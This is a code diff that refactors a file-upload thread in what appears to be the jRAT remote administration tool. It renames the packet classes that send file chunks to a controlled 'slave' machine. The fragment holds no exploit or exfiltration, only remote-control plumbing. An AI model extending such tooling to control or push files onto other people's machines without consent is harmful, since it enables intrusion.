@@ -1,10 +1,11 @@
 package jrat.module.fs;
 
+import jrat.common.Transfer;
 import jrat.common.TransferRunnable;
 import jrat.common.io.TransferData;
 import jrat.controller.Slave;
-import jrat.controller.packets.outgoing.Packet103CompleteServerUpload;
-import jrat.controller.packets.outgoing.Packet104ServerUploadPart;
+import jrat.module.fs.packets.upload.Packet102UploadState;
+import jrat.module.fs.packets.upload.Packet104Part;
 import jrat.module.fs.ui.PanelFileTransfers;
 
 import java.io.File;
@@ -56,7 +57,7 @@ public class ThreadUploadFile extends TransferRunnable {
 
 				int read = fileInput.read(chunk);
 				
-				slave.addToSendQueue(new Packet104ServerUploadPart(remoteFile, chunk, read));
+				slave.addToSendQueue(new Packet104Part(remoteFile, chunk, read));
 											
 				data.increaseRead(read);
 				PanelFileTransfers.instance.update();
@@ -72,7 +73,7 @@ public class ThreadUploadFile extends TransferRunnable {
 	}
 	
 	public void onComplete() {
-		slave.addToSendQueue(new Packet103CompleteServerUpload(data.getRemoteFile()));
+		slave.addToSendQueue(new Packet102UploadState(Transfer.Complete, data.getRemoteFile()));
 	}
 
 	public void setSlave(Slave slave) {
